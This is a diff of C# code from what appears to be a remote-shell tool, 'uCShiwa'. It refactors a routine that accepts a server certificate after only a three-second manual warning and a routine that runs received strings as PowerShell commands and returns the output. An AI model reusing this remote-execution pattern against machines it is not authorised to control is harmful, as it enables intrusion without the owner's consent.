@@ -17,14 +17,9 @@ namespace uCShiwa
         {
             //Be aware that there is no PKI, the authentication method is manual
             X509Certificate2 cert2 = new X509Certificate2(certificate);
-
-            string cn = cert2.Issuer;
-            string cedate = cert2.GetExpirationDateString();
-            string cpub = cert2.GetPublicKeyString();
-            string thumb = cert2.Thumbprint;
-
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("CN:{0}\nExpirDate:{1}\nPubKey:{2}\nThumprint:{3}\n", cn, cedate, cpub, thumb);
+            Console.WriteLine("CN:{0}\nExpirDate:{1}\nPubKey:{2}\nThumprint:{3}\n",
+                cert2.Issuer, cert2.GetExpirationDateString(), cert2.GetPublicKeyString(), cert2.Thumbprint);
             Console.WriteLine("YOU HAVE FEW SECONDS TO KILL THE PROCESS AND REJECT THE RISK...");
             Thread.Sleep(3000);
             Console.WriteLine("(accepted)");
@@ -35,6 +30,7 @@ namespace uCShiwa
 
         public static string executePwsh(string message)
         {
+            Console.WriteLine("received cmd: {0}",message);
             String output = String.Empty;
             try
             {
@@ -43,7 +39,7 @@ namespace uCShiwa
                     Collection<PSObject> results = ps.AddScript(message).Invoke();
                     foreach (PSObject result in results)
                     {
-                        output += result.ToString() + "\n";
+                        output += result.ToString() + Environment.NewLine;
                     }
                     ps.Commands.Clear();
                 }
@@ -57,6 +53,8 @@ namespace uCShiwa
             {
                 output = "(Empty)";
             }
+
+            Console.WriteLine(output);
             return output;
         }
     }
